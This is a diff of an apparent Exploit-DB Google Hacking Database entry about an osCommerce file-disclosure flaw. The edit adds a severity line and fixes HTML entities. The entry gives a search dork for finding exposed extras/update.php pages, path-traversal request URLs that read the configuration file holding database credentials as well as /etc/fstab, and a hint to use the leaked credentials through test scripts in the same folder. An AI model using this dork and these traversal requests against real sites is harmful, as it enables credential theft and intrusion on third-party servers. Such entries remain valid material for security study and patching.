@@ -1,4 +1,5 @@
 GHDB URL:         https://www.exploit-db.com/ghdb/1329
+Severity: 5 
 Category:         Advisories and Vulnerabilities
 Published Date:   2006-04-15
 Author:           anonymous
@@ -6,4 +7,4 @@ GoogleDork:       inurl:"extras/update.php" intext:mysql.php -display
 Description:      inurl:"extras/update.php" intext:mysql.php -display
 
 
-this is an osCommerce dork:inurl:"extras/update.php" intext:mysql.php -display or more simply: inurl:"extras/update.php" -display (this display some more hosts where error_reporting=0) I found this simple exploit, if extras/ folder is inside the www path, you can view all files on target system, including php files and so on, ex: http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=../catalog/includes/configure.php http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=../index.php http://[target]/[path]/extras/update.php?read_me=0&amp;readme_file=/etc/fstab also, if you succeed to view configure script with database details, you can connect to it trough some test scripts inside this folder...now I read this:http://www.securityfocus.com/bid/14294/infothis is actually unpatched/unresolved in 2.2 on Apr 2006
+this is an osCommerce dork:inurl:"extras/update.php" intext:mysql.php -display or more simply: inurl:"extras/update.php" -display (this display some more hosts where error_reporting=0) I found this simple exploit, if extras/ folder is inside the www path, you can view all files on target system, including php files and so on, ex: http://[target]/[path]/extras/update.php?read_me=0&readme_file=../catalog/includes/configure.php http://[target]/[path]/extras/update.php?read_me=0&readme_file=../index.php http://[target]/[path]/extras/update.php?read_me=0&readme_file=/etc/fstab also, if you succeed to view configure script with database details, you can connect to it trough some test scripts inside this folder...now I read this:http://www.securityfocus.com/bid/14294/infothis is actually unpatched/unresolved in 2.2 on Apr 2006
